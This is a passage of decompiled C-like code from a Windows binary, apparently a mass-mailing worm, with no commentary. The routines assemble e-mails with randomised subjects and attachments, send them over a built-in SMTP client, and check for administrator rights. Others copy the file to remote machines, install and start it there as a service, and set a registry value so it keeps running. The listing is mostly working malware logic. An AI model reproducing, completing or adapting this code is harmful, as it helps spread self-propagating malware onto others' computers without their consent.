  v1 = toupper_0(Dest[300]);
  v2 = Dest[428] == 0;
  Dest[300] = v1;
  if ( v2 )
    *((_DWORD *)Dest + 583) = 1;
  if ( !Dest[1712] )
  {
    v3 = sub_40347E(a0, *((_DWORD *)Dest + 584));
    sub_404261(Dest + 1712, 0, (int)v3, 1);
  }
}

//----- (004018E9) --------------------------------------------------------
int __cdecl sub_4018E9(int a1)
{
  int v1; // ebx
  int *v2; // edi
  signed __int16 v3; // cx
  char *v4; // ebx
  int v5; // esi
  char *v6; // edi
  unsigned int v7; // eax
  char *v8; // eax
  struct _SYSTEMTIME SystemTime; // [esp+Ch] [ebp-1Ch] BYREF
  int v11; // [esp+1Ch] [ebp-Ch]
  int v12; // [esp+20h] [ebp-8h]
  int v13; // [esp+24h] [ebp-4h] BYREF

  GetLocalTime(&SystemTime);
  v1 = 0;
  v11 = sub_4034AE(byte_4106E6, 0);
  if ( v11 <= 0 )
    return 0;
  v2 = (int *)&unk_40D218;
  do
  {
    v13 = *v2;
    v12 = v13;
    sub_404B75((__int16 *)&v13, -(__int16)((int)v2 >= (int)&unk_40D228 ? 5 : 15));
    v3 = v12;
    if ( (__int16)v13 > (__int16)v12 )
    {
      v3 = v12 + 12;
      HIWORD(v12) += 30;
    }
    if ( (__int16)v13 <= (int)SystemTime.wMonth
      && SystemTime.wMonth <= v3
      && SHIWORD(v13) <= (int)SystemTime.wDay
      && SystemTime.wDay <= SHIWORD(v12) + 2 )
    {
      break;
    }
    ++v1;
    ++v2;
  }
  while ( v1 < v11 );
  if ( v1 >= v11 )
    return 0;
  v4 = sub_40347E(byte_4106E6, v1);
  v5 = sub_4047B6(0) & 1;
  v6 = (char *)(a1 + 300);
  sub_40347E(aIim, v5);
  sub_407750();
  if ( !(sub_4047B6(0) % 3u) || v5 )
  {
    v7 = sub_4047B6(0);
    v8 = sub_40347E(&::a1, v7 % 6);
    strcat(v6, v8);
    strcat(v6, Source);
  }
  strcat(v6, v4);
  return 1;
}
// 4103A4: using guessed type char a1;

//----- (00401A1E) --------------------------------------------------------
void __cdecl sub_401A1E(char *Dest)
{
  unsigned int v2; // edi
  unsigned int v3; // eax
  char *v4; // edi
  char v5; // al
  char *v6; // eax
  unsigned int v7; // eax
  char v8; // al
  char *v9; // eax
  char v10; // al
  int v11; // edi
  char v12; // al
  char *v13; // ebx
  char *v14; // eax
  char *v15; // eax
  char *v16; // [esp-4h] [ebp-C18h]
  char *v17; // [esp-4h] [ebp-C18h]
  char Source[1024]; // [esp+Ch] [ebp-C08h] BYREF
  char v19[1024]; // [esp+40Ch] [ebp-808h] BYREF
  char v20[4]; // [esp+80Ch] [ebp-408h] BYREF
  char *Buffer; // [esp+C0Ch] [ebp-8h]
  int v22; // [esp+C10h] [ebp-4h]
  char *Destination; // [esp+C1Ch] [ebp+8h]

  v22 = 0;
  Source[0] = 0;
  sub_403BB8((int)(Dest + 100), (int)Source, v19);
  Buffer = Dest + 428;
  Dest[428] = 0;
  Source[100] = 0;
  v20[0] = 0;
  Destination = Dest + 300;
  *Destination = 0;
  Dest[1712] = 0;
  v2 = sub_4034AE(a0, 0);
  *((_DWORD *)Dest + 584) = sub_4047B6(0) % v2;
  if ( (sub_4047B6(0) & 3) == 0 && sub_4018E9((int)Dest) )
    return;
  if ( !(sub_4047B6(0) % 0x18u) )
  {
    *((_DWORD *)Dest + 583) = 0;
    sub_407750();
    sprintf(Buffer, &Format, Dest + 200, Destination, &unk_410EB4);
    return;
  }
  if ( sub_4047B6(0) % 0x18u )
  {
    if ( (sub_4047B6(0) & 0x1F) == 0 )
      goto LABEL_23;
    if ( (sub_4047B6(0) & 1) == 0 && byte_4937EC && sub_403A4F(&byte_4937EC, v20, 8, 50, 1) )
    {
      *((_DWORD *)Dest + 583) = 1;
      v7 = sub_4047B6(0);
      v19[0] = 0;
      if ( v7 % 0xA )
      {
        sub_407750();
        if ( (sub_4047B6(0) & 0x3F) == 0 )
        {
          v19[0] = 0;
          sub_403A4F(&byte_4937EC, v19, 8, 800, 1);
          sub_407750();
        }
      }
      else
      {
        v8 = sub_4047B6(0);
        v9 = sub_40347E(a8, (v8 & 1) + 4);
        sprintf(Destination, v9, v20);
        sub_40220C((int)Dest, v20);
      }
      return;
    }
  }
  else
  {
    v22 = 1;
  }
  if ( sub_4047B6(0) % 3u && !v22 )
  {
    Buffer = (char *)sub_4034AE(a5uA, 0);
    v3 = sub_4047B6(0);
    v4 = sub_40347E(a5uA, v3 % (unsigned int)Buffer);
    if ( !(sub_4047B6(0) % 3u) )
    {
      if ( sub_4047B6(0) % 0xAu )
      {
        v10 = sub_4047B6(0);
        sub_40347E(a8, v10 & 3);
        sub_407750();
        if ( (sub_4047B6(0) & 1) != 0 )
        {
          strcat(Destination, Source);
          strcat(Destination, asc_40F03C);
        }
        *v4 = tolower_0(*v4);
        strcat(Destination, v4);
      }
      else
      {
        v5 = sub_4047B6(0);
        v6 = sub_40347E(a8, (v5 & 1) + 4);
        sprintf(Destination, v6, v4);
        sub_40220C((int)Dest, v4);
      }
      return;
    }
LABEL_23:
    sub_407750();
    return;
  }
  v11 = sub_4047B6(0) % 5u;
  if ( v22 )
    v11 = 0;
  v22 = dword_40D1F0[v11];
  Buffer = (char *)dword_40D204[v11];
  v22 += sub_4047B6(0) % (unsigned int)Buffer;
  if ( v11 >= 4 )
  {
    v17 = sub_40347E(&a1, v22);
    v15 = sub_40347E(asc_410354, v11);
    sprintf(v20, v15, v17);
  }
  else
  {
    if ( (sub_4047B6(0) & 1) != 0 || v11 == 3 )
    {
      v13 = byte_4131A0;
    }
    else
    {
      v12 = sub_4047B6(0);
      v13 = sub_40347E(aU, (v12 & 1) + 8);
    }
    v16 = sub_40347E(&a1, v22);
    v14 = sub_40347E(asc_410354, v11);
    sprintf(v20, v14, v13, v16);
  }
  sub_407750();
  sub_401E02((int)Dest, v11, (char *)v22);
}
// 4103A4: using guessed type char a1;

//----- (00401E02) --------------------------------------------------------
char *__cdecl sub_401E02(int a1, int a2, char *Dest)
{
  char v3; // al
  char *v4; // edi
  char *v5; // eax
  char v6; // al
  unsigned int v7; // eax
  char *v8; // eax
  char v9; // al
  char *v10; // eax
  unsigned int v11; // eax
  char *result; // eax
  unsigned int v13; // edi
  unsigned int v14; // eax
  char v15; // al
  char *v16; // eax
  char *v17; // eax
  char *v18; // eax
  char *v19; // eax
  char *v20; // eax
  char *v21; // eax
  char *v22; // eax
  char *v23; // eax
  char v24; // al
  char *v25; // [esp-8h] [ebp-274h]
  char *v26; // [esp-4h] [ebp-270h]
  char *v27; // [esp-4h] [ebp-270h]
  char *v28; // [esp-4h] [ebp-270h]
  char *v29; // [esp-4h] [ebp-270h]
  char v30[200]; // [esp+Ch] [ebp-260h] BYREF
  char Buffer[200]; // [esp+D4h] [ebp-198h] BYREF
  char Source[200]; // [esp+19Ch] [ebp-D0h] BYREF
  char *v33; // [esp+264h] [ebp-8h]
  unsigned int v34; // [esp+268h] [ebp-4h]
  char *v35; // [esp+278h] [ebp+Ch]
  char *Destination; // [esp+27Ch] [ebp+10h]

  if ( a2 == 4 )
  {
    v34 = sub_4047B6(0) & 1;
    *(_DWORD *)(a1 + 2332) = 0;
    *(_DWORD *)(a1 + 2336) = 0;
    v13 = sub_4034AE(aAm1y, 0);
    v14 = sub_4047B6(0);
    v33 = sub_40347E(aAm1y, v14 % v13);
    sub_407750();
    if ( (sub_4047B6(0) & 1) != 0 )
    {
      v35 = byte_4131A0;
    }
    else
    {
      v15 = sub_4047B6(0);
      v35 = sub_40347E(aU, (v15 & 1) + 8);
    }
    v16 = sub_40347E(aU, 4);
    sprintf(Source, v16, v35);
    strcat(Buffer, Source);
    v28 = sub_40347E(&::a1, (int)Dest);
    v17 = sub_40347E(asc_410354, 4);
    sprintf(Source, v17, v28);
    strcat(Buffer, Source);
    sub_407750();
    v29 = sub_40347E(aU, (int)&Dest[-dword_40D200 + 6]);
    v18 = sub_40347E(aU, 5);
    sprintf(v30, v18, v35, v29);
    strcat(Source, v30);
    if ( v34 )
    {
      sub_407750();
      strcat((char *)(a1 + 428), asc_410776);
      v19 = Source;
    }
    else
    {
      sub_407750();
      strcat((char *)(a1 + 428), asc_410776);
      v19 = Buffer;
    }
    strcat((char *)(a1 + 428), v19);
    strcat((char *)(a1 + 428), asc_410776);
    strcat((char *)(a1 + 428), asc_410776);
    v20 = sub_40347E(aU, 13);
    strcat((char *)(a1 + 428), v20);
    v21 = sub_40347E(aU, 10);
    strcat((char *)(a1 + 428), v21);
    v22 = sub_40347E(aU, 11);
    strcat((char *)(a1 + 428), v22);
    strcat((char *)(a1 + 428), v33);
    v23 = sub_40347E(aU, 12);
    strcat((char *)(a1 + 428), v23);
    *(_DWORD *)(a1 + 2332) = 0;
    v24 = sub_4047B6(0);
    sub_40347E(&aE, v24 & 1);
    sub_407750();
    result = strcat((char *)(a1 + 1712), a0);
  }
  else
  {
    if ( (sub_4047B6(0) & 1) != 0 || a2 == 3 )
    {
      v4 = byte_4131A0;
    }
    else
    {
      v3 = sub_4047B6(0);
      v4 = sub_40347E(aU, (v3 & 1) + 8);
    }
    v26 = sub_40347E(&::a1, (int)Dest);
    v5 = sub_40347E(asc_410354, a2);
    sprintf(Buffer, v5, v4, v26);
    v6 = sub_4047B6(0);
    v27 = sub_40347E(aU, (v6 & 1) + 16);
    v7 = sub_4047B6(0);
    v25 = sub_40347E(aU, v7 % 3 + 18);
    v8 = sub_40347E(aU, 15);
    sprintf(Source, v8, v25, v27);
    if ( (sub_4047B6(0) & 1) == 0 )
    {
      v9 = sub_4047B6(0);
      sub_40347E(a8, v9 & 1);
      sub_407750();
    }
    Destination = (char *)(a1 + 428);
    v10 = sub_40347E(aU, 14);
    strcat((char *)(a1 + 428), v10);
    strcat((char *)(a1 + 428), Buffer);
    if ( !a2 )
    {
      strcat(Destination, asc_410776);
      strcat(Destination, aUE);
      *(_DWORD *)(a1 + 2332) = 0;
      *(_DWORD *)(a1 + 2336) = 0;
      v34 = sub_4034AE(&aE, 0);
      v11 = sub_4047B6(0);
      sub_40347E(&aE, v11 % v34);
      sub_407750();
      strcat((char *)(a1 + 1712), a0);
    }
    strcat(Destination, asc_410776);
    result = strcat(Destination, Source);
  }
  return result;
}
// 40D200: using guessed type int dword_40D200;
// 4103A4: using guessed type char a1;
// 410D74: using guessed type char aE;

//----- (0040220C) --------------------------------------------------------
char *__cdecl sub_40220C(int a1, char *Source)
{
  char *v2; // eax
  char *v3; // eax
  char v4; // al
  char *v5; // eax
  char *v6; // eax
  char *result; // eax
  char v8[100]; // [esp+10h] [ebp-64h] BYREF

  sprintf((char *const)(a1 + 428), aU, a1 + 200);
  strcat((char *)(a1 + 428), asc_410776);
  strcat((char *)(a1 + 428), asc_410776);
  strcat((char *)(a1 + 428), &byte_410590);
  strcat((char *)(a1 + 428), (const char *)(a1 + 100));
  strcat((char *)(a1 + 428), asc_410776);
  v2 = sub_40347E(&byte_410590, 1);
  strcat((char *)(a1 + 428), v2);
  strcat((char *)(a1 + 428), (const char *)(a1 + 200));
  strcat((char *)(a1 + 428), asc_410776);
  v3 = sub_40347E(&byte_410590, 2);
  strcat((char *)(a1 + 428), v3);
  strcat((char *)(a1 + 428), Source);
  strcat((char *)(a1 + 428), asc_410776);
  v4 = sub_4047B6(0);
  v5 = sub_40347E(aU, (v4 & 1) + 1);
  strcat((char *)(a1 + 428), v5);
  v6 = sub_40347E(aU, 3);
  strcat((char *)(a1 + 428), v6);
  sub_403BB8(a1 + 100, 0, v8);
  sub_40347E(&byte_41077D, 1);
  sub_407750();
  result = strcat((char *)(a1 + 200), v8);
  *(_DWORD *)(a1 + 2332) = 0;
  return result;
}

//----- (00402319) --------------------------------------------------------
char *__cdecl sub_402319(int Memory, char *Source)
{
  char *v4; // eax
  char *v5; // eax
  char *v6; // eax
  char *v7; // eax
  const char *v8; // eax
  const CHAR *v9; // ebx
  unsigned int v10; // eax
  char *v11; // eax
  char Buffer[1024]; // [esp+Ch] [ebp-868h] BYREF
  char Sourcea[1024]; // [esp+40Ch] [ebp-468h] BYREF
  char v15[100]; // [esp+80Ch] [ebp-68h] BYREF
  int v16; // [esp+870h] [ebp-4h] BYREF
  int lpMem; // [esp+87Ch] [ebp+8h]
  char *lpMema; // [esp+87Ch] [ebp+8h]
  char *lpMemb; // [esp+87Ch] [ebp+8h]
  char *Destination; // [esp+880h] [ebp+Ch]

  sub_407750();
  sub_403BB8(Memory + 200, (int)Sourcea, Buffer);
  sprintf(Buffer, &byte_410D2B, Sourcea, Memory + 200);
  strcat(Source, Buffer);
  strcat(Source, &byte_41077D);
  v4 = sub_40347E(&byte_410590, 1);
  strcat(Source, v4);
  strcat(Source, (const char *)(Memory + 100));
  strcat(Source, &byte_41077D);
  v5 = sub_40347E(&byte_410590, 2);
  strcat(Source, v5);
  strcat(Source, (const char *)(Memory + 300));
  strcat(Source, &byte_41077D);
  strcat(Source, &byte_41079D);
  Destination = (char *)(Memory + 2232);
  strcat(Source, (const char *)(Memory + 2232));
  strcat(Source, &byte_41077D);
  strcat(Source, &byte_41077D);
  sub_40372F(v15, 8, 20, 7);
  sub_40264B(Source, (char *)(Memory + 2232), 1);
  v6 = &byte_41077D;
  if ( *(_DWORD *)(Memory + 2332) )
  {
    sprintf(Buffer, &byte_4108FB, v15);
    v6 = Buffer;
  }
  sprintf(Sourcea, &byte_4107E1, v6);
  strcat(Source, Sourcea);
  strcat(Source, (const char *)(Memory + 428));
  strcat(Source, aX4);
  strcat(Source, &byte_41077D);
  strcat(Source, &byte_41077D);
  lpMem = sub_4047B6(0) & 1;
  if ( !*(_DWORD *)(Memory + 2332) )
    lpMem = 2;
  sub_40264B(Source, Destination, 1);
  v7 = sub_40347E(asc_4108C1, lpMem);
  sprintf(Sourcea, &byte_410867, v7, Memory + 1712, v15);
  strcat(Source, Sourcea);
  strcat(Source, &byte_41077D);
  strcat(Source, &byte_41077D);
  v8 = (const char *)sub_4041C8((LPCSTR)(Memory + 1452), (int)&v16, 1);
  lpMema = (char *)v8;
  if ( v8 )
  {
    strcat(Source, v8);
    sub_407BEB(lpMema);
  }
  strcat(Source, &byte_41077D);
  v9 = (const CHAR *)(Memory + 1972);
  if ( *v9 )
  {
    v10 = sub_403E16(v9);
    v16 = v10;
    if ( v10 < 0xC800 || v10 < 0x7D000 && (sub_4047B6(0) & 1) != 0 )
    {
      lpMemb = (char *)sub_4041C8(v9, (int)&v16, 0);
      if ( lpMemb )
      {
        sub_40264B(Source, Destination, 1);
        sub_40264B(Source, Destination, 1);
        _splitpath(v9, 0, 0, Buffer, Sourcea);
        strcat(Buffer, Sourcea);
        v11 = sub_40347E(asc_4108C1, 2);
        sprintf(Sourcea, &byte_410867, v11, Buffer, v15);
        strcat(Source, Sourcea);
        strcat(Source, &byte_41077D);
        strcat(Source, &byte_41077D);
        strcat(Source, lpMemb);
        strcat(Source, &byte_41077D);
        sub_407BEB(lpMemb);
      }
    }
  }
  sub_40264B(Source, Destination, 0);
  return strcat(Source, asc_40F040);
}

//----- (0040264B) --------------------------------------------------------
char *__cdecl sub_40264B(char *Dest, char *Source, int a3)
{
  char *result; // eax

  strcat(Dest, asc_40F040);
  result = strcat(Dest, Source);
  if ( a3 )
    result = strcat(Dest, &byte_41077D);
  return result;
}

//----- (00402680) --------------------------------------------------------
int __cdecl sub_402680(_DWORD *a1)
{
  DWORD v1; // eax
  DWORD v3; // eax
  HLOCAL v4; // eax
  HLOCAL v5; // eax
  PSID *v6; // esi
  PSID pSid1; // [esp+Ch] [ebp-30h]
  struct _SID_IDENTIFIER_AUTHORITY pIdentifierAuthority; // [esp+14h] [ebp-28h] BYREF
  HANDLE hObject; // [esp+1Ch] [ebp-20h]
  int v11; // [esp+20h] [ebp-1Ch]
  PSID pSid; // [esp+24h] [ebp-18h] BYREF
  PSID pSid2; // [esp+28h] [ebp-14h] BYREF
  HANDLE TokenHandle; // [esp+2Ch] [ebp-10h] BYREF
  SIZE_T uBytes; // [esp+30h] [ebp-Ch] BYREF
  HLOCAL hMem; // [esp+34h] [ebp-8h]
  DWORD v17; // [esp+38h] [ebp-4h]
  unsigned int v18; // [esp+44h] [ebp+8h]

  v1 = GetCurrentProcessId();
  TokenHandle = 0;
  uBytes = 50;
  hMem = 0;
  pIdentifierAuthority.Value[0] = 0;
  pIdentifierAuthority.Value[1] = 0;
  pIdentifierAuthority.Value[2] = 0;
  pIdentifierAuthority.Value[3] = 0;
  pIdentifierAuthority.Value[4] = 0;
  pIdentifierAuthority.Value[5] = 5;
  pSid = 0;
  pSid2 = 0;
  v17 = 0;
  v11 = 0;
  *a1 = 0;
  hObject = OpenProcess(0x1F0FFFu, 0, v1);
  if ( !OpenProcessToken(hObject, 8u, &TokenHandle) || (v4 = LocalAlloc(0, uBytes), (hMem = v4) == 0) )
  {
    v3 = GetLastError();
LABEL_3:
    v17 = v3;
    goto LABEL_23;
  }
  if ( !GetTokenInformation(TokenHandle, TokenGroups, v4, uBytes, &uBytes)
    && (GetLastError() != 122
     || (LocalFree(hMem), v5 = LocalAlloc(0, uBytes), (hMem = v5) == 0)
     || !GetTokenInformation(TokenHandle, TokenGroups, v5, uBytes, &uBytes))
    || !AllocateAndInitializeSid(&pIdentifierAuthority, 1u, 4u, 0, 0, 0, 0, 0, 0, 0, &pSid)
    || !AllocateAndInitializeSid(&pIdentifierAuthority, 1u, 6u, 0, 0, 0, 0, 0, 0, 0, &pSid2) )
  {
    v3 = GetLastError();
    goto LABEL_3;
  }
  v18 = 0;
  if ( *(_DWORD *)hMem )
  {
    v6 = (PSID *)((char *)hMem + 4);
    while ( 1 )
    {
      pSid1 = *v6;
      if ( EqualSid(*v6, pSid) )
      {
        v11 = 1;
        *a1 = 0;
        goto LABEL_20;
      }
      if ( EqualSid(pSid1, pSid2) )
        break;
      ++v18;
      v6 += 2;
      if ( v18 >= *(_DWORD *)hMem )
        goto LABEL_20;
    }
    *a1 = 1;
    v11 = 0;
  }
LABEL_20:
  if ( !*a1 && !v11 )
    *a1 = 1;
LABEL_23:
  if ( pSid2 )
    FreeSid(pSid2);
  if ( pSid )
    FreeSid(pSid);
  if ( hMem )
    LocalFree(hMem);
  if ( TokenHandle )
    CloseHandle(TokenHandle);
  if ( hObject )
    CloseHandle(hObject);
  return v17;
}

//----- (0040284D) --------------------------------------------------------
int __cdecl sub_40284D(LPCSTR lpMachineName, int Source, char *hSCObject, HKEY hKey, int a5, int a6)
{
  int v6; // eax
  int v7; // eax
  size_t v8; // eax
  bool v9; // zf
  char *v10; // eax
  int v11; // eax
  SC_HANDLE v12; // edi
  SC_HANDLE v13; // esi
  char v15[4116]; // [esp+Ch] [ebp-2DE0h] BYREF
  char v16; // [esp+1020h] [ebp-1DCCh]
  WCHAR v17; // [esp+2288h] [ebp-B64h] BYREF
  char v18[516]; // [esp+228Ah] [ebp-B62h] BYREF
  __int16 v19; // [esp+248Eh] [ebp-95Eh]
  WCHAR WideCharStr; // [esp+2490h] [ebp-95Ch] BYREF
  char v21[516]; // [esp+2492h] [ebp-95Ah] BYREF
  __int16 v22; // [esp+2696h] [ebp-756h]
  CHAR SubKey[200]; // [esp+2698h] [ebp-754h] BYREF
  CHAR ValueName[260]; // [esp+2760h] [ebp-68Ch] BYREF
  CHAR ExistingFileName[260]; // [esp+2864h] [ebp-588h] BYREF
  CHAR MultiByteStr[500]; // [esp+2968h] [ebp-484h] BYREF
  char v27[260]; // [esp+2B5Ch] [ebp-290h] BYREF
  CHAR NewFileName[260]; // [esp+2C60h] [ebp-18Ch] BYREF
  CHAR ServiceName[100]; // [esp+2D64h] [ebp-88h] BYREF
  CHAR LibFileName[32]; // [esp+2DC8h] [ebp-24h] BYREF
  int v31; // [esp+2DE8h] [ebp-4h] BYREF

  v31 = 32;
  ServiceName[0] = 0;
  if ( hSCObject )
    sub_407750();
  else
    sub_40372F(ServiceName, 5, 10, 7);
  sub_407750();
  sub_407750();
  strcat(NewFileName, (const char *)Source);
  if ( hKey )
  {
    sub_407750();
  }
  else
  {
    v6 = sub_407F3F();
    sub_404261(v27, v6 % 2, (int)a0, 1);
  }
  if ( dword_4938F0 )
  {
    v7 = sub_407F3F();
    sub_404261(v27, v7 % 2, 0, 1);
  }
  v8 = strlen(NewFileName);
  v9 = v27[v8 + 259] == 92;
  v10 = &v27[v8 + 259];
  if ( v9 )
    *v10 = 0;
  if ( v27[0] != 92 )
    strcat(NewFileName, asc_40F044);
  strcat(NewFileName, v27);
  if ( !CopyFileA(ExistingFileName, NewFileName, 0) )
    return 0;
  if ( sub_407F3F() % 5 )
  {
    v11 = sub_407F3F();
    sub_40406E(NewFileName, v11 % 10240 + 86144);
  }
  sub_407C00((unsigned int)v15, Str1, 0x227Au);
  v16 = 0;
  sub_405705(NewFileName, v15);
  sub_405522(NewFileName);
  if ( dword_4938F0 )
    return 0;
  LoadLibraryA(LibFileName);
  if ( !_strcmpi(lpMachineName + 2, LibFileName) )
    return 0;
  v12 = OpenSCManagerA(lpMachineName, 0, 2u);
  if ( !v12 && !a6 )
    return 0;
  CreateServiceA(v12, ServiceName, ServiceName, 0, 0x110u, 3u, 0, NewFileName, 0, 0, 0, 0, 0);
  CloseServiceHandle(v12);
  v13 = OpenSCManagerA(lpMachineName, 0, 1u);
  hSCObject = (char *)OpenServiceA(v13, ServiceName, 0x10u);
  a5 = StartServiceA((SC_HANDLE)hSCObject, 0, 0);
  CloseServiceHandle((SC_HANDLE)hSCObject);
  CloseServiceHandle(v13);
  if ( !a5 )
  {
    WideCharStr = 0;
    v17 = 0;
    memset(v21, 0, sizeof(v21));
    v22 = 0;
    memset(v18, 0, sizeof(v18));
    hSCObject = 0;
    a5 = 0;
    v19 = 0;
    if ( !dword_493904 )
      return 0;
    if ( *(_BYTE *)Source == 92 )
      a5 = 1;
    MultiByteToWideChar(0, 1u, lpMachineName, -1, &WideCharStr, 260);
    MultiByteToWideChar(0, 1u, (LPCCH)(Source + a5), -1, &v17, 260);
    if ( !dword_493904(&WideCharStr, &v17, 2, &hSCObject, &v31) )
    {
      MultiByteStr[0] = 0;
      WideCharToMultiByte(0, 0, *((LPCWCH *)hSCObject + 6), -1, MultiByteStr, 260, 0, 0);
      if ( !RegConnectRegistryA(lpMachineName, HKEY_LOCAL_MACHINE, &hKey) )
      {
        sub_403CE3(SubKey, 3);
        strcat(MultiByteStr, asc_40F044);
        strcat(MultiByteStr, v27);
        ValueName[0] = 0;
        _splitpath(MultiByteStr, 0, 0, ValueName, 0);
        sub_40464B(hKey, SubKey, ValueName, (BYTE *)MultiByteStr);
        RegCloseKey(hKey);
      }
      if ( dword_49390C )
        dword_49390C(hSCObject);
    }
  }
  return 1;
}
// 493904: invalid function type has been ignored
// 49390C: invalid function type has been ignored
// 4938F0: using guessed type int dword_4938F0;
// 493904: using guessed type int (__cdecl *dword_493904)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 49390C: using guessed type int (__cdecl *dword_49390C)(_DWORD);

//----- (00402C3B) --------------------------------------------------------
int __thiscall sub_402C3B(void *this, char *Source, int a3, size_t Size, int a5)
{
  void *v6; // eax
  void *v7; // eax
  void *v9; // [esp-Ch] [ebp-18h]
  int v10; // [esp-4h] [ebp-10h]

  *((_DWORD *)this + 6) = a5;
  *(_DWORD *)this = 0;
  *((_DWORD *)this + 3) = 0;
  sub_407750();
  *((_WORD *)this + 206) = a3;
  *((_WORD *)this + 207) = 25;
  v6 = sub_407F8F(Size);
  *((_DWORD *)this + 1) = v6;
  if ( !v6 || (v7 = sub_407F8F(Size), (*((_DWORD *)this + 4) = v7) == 0) )
  {
    *((_DWORD *)this + 105) = -2147483646;
    return 0;
  }
  v9 = (void *)*((_DWORD *)this + 1);
  *((_DWORD *)this + 2) = Size;
  *((_DWORD *)this + 5) = Size;
  memset(v9, 0, Size);
  memset(*((void **)this + 4), 0, Size);
  *((_DWORD *)this + 105) = 0;
  *((_DWORD *)this + 106) = 0;
  *((_DWORD *)this + 107) = 0;
  *((_BYTE *)this + 284) = 0;
  if ( !sub_403222((SOCKET *)this + 104, a3, 1, 1) )
  {
    *((_DWORD *)this + 105) = -2147483643;
    return 0;
  }
  if ( *((_DWORD *)this + 3) && *(_DWORD *)this )
    v10 = 1;
  else
    v10 = 2;
  return v10;
}

//----- (00402D0D) --------------------------------------------------------
int __thiscall sub_402D0D(int this)
{
  SOCKET *v2; // edi
  int v3; // eax
  int v4; // esi

  if ( *(_DWORD *)(this + 4) )
    sub_407BEB(*(LPVOID *)(this + 4));
  if ( *(_DWORD *)(this + 16) )
    sub_407BEB(*(LPVOID *)(this + 16));
  v2 = (SOCKET *)(this + 416);
  sub_4032CF((SOCKET *)(this + 416), buf, 6, 0);
  do
    v3 = sub_40330B();
  while ( !v3 );
  if ( v3 == 1 )
    v4 = sub_403034((SOCKET *)this, 0xDDu);
  else
    v4 = 1;
  sub_4032FD(v2);
  return v4;
}

//----- (00402D72) --------------------------------------------------------
int __thiscall sub_402D72(int this)
{
  int result; // eax
  int v3; // eax

  if ( sub_40326C((SOCKET *)(this + 416), (char *)(this + 28), *(_WORD *)(this + 412)) )
  {
    do
      v3 = sub_40330B();
    while ( !v3 );
    if ( v3 == 1 )
    {
      result = sub_403034((SOCKET *)this, 0xDCu);
    }
    else
    {
      *(_DWORD *)(this + 420) = -2147483645;
      result = 1;
    }
  }
  else
  {
    result = -2147483647;
    *(_DWORD *)(this + 420) = -2147483647;
  }
  return result;
}

//----- (00402DCE) --------------------------------------------------------
int __thiscall sub_402DCE(int this, int a2, int len)
{
  int v4; // eax
  int v5; // eax
  int result; // eax
  char *v7; // edi
  size_t v8; // eax
  char buf[256]; // [esp+Ch] [ebp-104h] BYREF
  unsigned int v10; // [esp+10Ch] [ebp-4h]

  sprintf(buf, "HELO %s\r\n", (const char *)(this + 284));
  v4 = strlen(buf);
  sub_4032CF((SOCKET *)(this + 416), buf, v4, 0);
  do
    v5 = sub_40330B();
  while ( !v5 );
  if ( v5 == 1 )
  {
    result = sub_403034((SOCKET *)this, 0xFAu);
    if ( !result )
    {
      result = sub_402EE0((SOCKET *)this);
      if ( !result )
      {
        v10 = 0;
        v7 = *(char **)(this + 4);
        if ( *(_DWORD *)this )
        {
          while ( 1 )
          {
            result = sub_402F9A((SOCKET *)this, v7);
            if ( result )
              break;
            v8 = strlen(v7);
            ++v10;
            v7 += v8 + 1;
            if ( v10 >= *(_DWORD *)this )
              goto LABEL_9;
          }
        }
        else
        {
LABEL_9:
          sub_4032CF((SOCKET *)(this + 416), aData, 7, 0);
          result = sub_403034((SOCKET *)this, 0x162u);
          if ( !result )
          {
            sub_4032CF((SOCKET *)(this + 416), (char *)a2, len, 0);
            sub_4032CF((SOCKET *)(this + 416), asc_40F050, 5, 0);
            result = sub_403034((SOCKET *)this, 0xFAu);
          }
        }
      }
    }
  }
  else
  {
    *(_DWORD *)(this + 420) = -2147483645;
    result = 1;
  }
  return result;
}

//----- (00402EE0) --------------------------------------------------------
int __thiscall sub_402EE0(SOCKET *this)
{
  char *v2; // ebx
  int result; // eax
  const char *v4; // edi
  SOCKET i; // ebp
  int v6; // eax
  int v7; // ebp

  v2 = (char *)sub_407F8F(this[5] + 100);
  if ( !v2 )
    return 2;
  sub_407750();
  v4 = (const char *)this[4];
  for ( i = 0; i < this[3]; v4 += strlen(v4) + 1 )
  {
    strcat(v2, v4);
    strcat(v2, Source);
    ++i;
  }
  strcat(v2, asc_40F06C);
  v6 = strlen(v2);
  sub_4032CF(this + 104, v2, v6, 0);
  do
    v7 = sub_40330B();
  while ( !v7 );
  sub_407BEB(v2);
  result = 1;
  if ( v7 == 1 )
    return sub_403034(this, 0xFAu);
  this[105] = -2147483645;
  return result;
}

//----- (00402F9A) --------------------------------------------------------
int __thiscall sub_402F9A(SOCKET *this, char *Str)
{
  size_t v3; // eax
  char *v4; // esi
  int result; // eax
  int v6; // eax
  int v7; // ebp

  v3 = strlen(Str);
  v4 = (char *)sub_407F8F(v3 + 100);
  if ( !v4 )
    return 2;
  sub_407750();
  strcat(v4, Str);
  strcat(v4, asc_40F06C);
  v6 = strlen(v4);
  sub_4032CF(this + 104, v4, v6, 0);
  do
    v7 = sub_40330B();
  while ( !v7 );
  sub_407BEB(v4);
  result = 1;
  if ( v7 == 1 )
    return sub_403034(this, 0xFAu);
  this[105] = -2147483645;
  return result;
}

//----- (00403034) --------------------------------------------------------
int __thiscall sub_403034(SOCKET *this, SOCKET a2)
{
  int v3; // eax
  int v4; // ecx
  int v6; // [esp-4h] [ebp-410h]
  char buf[1024]; // [esp+8h] [ebp-404h] BYREF
  int v8; // [esp+408h] [ebp-4h] BYREF

  sub_4032E6(this + 104, buf, 1024, 0);
  do
    v3 = sub_40330B();
  while ( !v3 );
  if ( v3 == 1 )
  {
    sscanf(buf, "%d", &v8);
    v4 = v8;
    if ( a2 == v8 )
      return 0;
    this[105] = -2147483644;
    this[106] = v4;
    this[107] = a2;
    v6 = 2;
  }
  else
  {
    this[105] = -2147483645;
    v6 = 1;
  }
  return v6;
}

//----- (004030BF) --------------------------------------------------------
void __stdcall sub_4030BF(int a1)
{
  sub_407750();
}

//----- (004030D4) --------------------------------------------------------
void *__thiscall sub_4030D4(int this, char *Str)
{
  const char *v3; // edi
  size_t i; // ebx
  unsigned int v5; // eax
  void *result; // eax
  unsigned int v7; // ebx
  size_t v8; // [esp-4h] [ebp-14h]
  unsigned int v9; // [esp+Ch] [ebp-4h]

  v3 = *(const char **)(this + 16);
  v9 = 0;
  for ( i = strlen(Str); v9 < *(_DWORD *)(this + 12); v3 += strlen(v3) + 1 )
    ++v9;
  v5 = *(_DWORD *)(this + 20);
  if ( (unsigned int)&v3[i - *(_DWORD *)(this + 16)] > v5 )
  {
